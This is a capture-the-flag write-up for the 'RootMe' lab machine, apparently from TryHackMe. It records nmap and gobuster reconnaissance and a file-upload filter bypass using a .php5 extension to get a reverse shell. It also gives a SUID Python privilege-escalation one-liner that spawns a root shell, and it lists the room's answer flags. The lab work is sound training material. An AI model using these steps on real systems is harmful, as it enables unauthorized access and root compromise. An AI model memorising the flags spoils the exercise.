# RootMe

export IP=10.10.235.187

## Task 2 - Reconnaissance

### 1 - Scan the machine, how many ports are open?
cmd: nmap -sC -sV -oN nmap/initial $IP
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home

```
Answer: 2
### 2 - What version of Apache are running?
Answer: 2.4.29
### 3 - What service is running on port 22?
Answer: ssh
### 4 - Find directories on the web server using the GoBuster tool.
Answer: NA

### 5 - What is the hidden directory?
cmd: gobuster dir -u http://$IP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -t 40 -o gobuster/big.log -x php,txt,html

```
/index.php (Status: 200)
/uploads (Status: 301)
/css (Status: 301)
/js (Status: 301)
/panel (Status: 301)
```

Answer: /panel/

## Task 3 - Getting a shell

### 1 - user.txt

in the /panel directory we can upload files ! <br>
Lets test some php rev shell right away... <br>

.php was blocked, changed to .php5 and well, it worked <br>
```
cat ~/user.txt
THM{y0u_g0t_a_sh3ll}
```
Answer: THM{y0u_g0t_a_sh3ll}

## Task 4 - Privilege escalation

### 1 - Search for files with SUID permission, which file is weird? 

cmd: find / -type f -perm /4000 -print 2>/dev/null

```
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python <- wth, python with SUID
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec 

(53 found !)
```


### 2 - find a form to escalate your privileges
```
python -c 'import os; os.execl("/bin/bash", "sh", "-p")'

whoami 
root
```

Answer: NA

### 3 - root.txt

```
cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

Answer: THM{pr1v1l3g3_3sc4l4t10n}
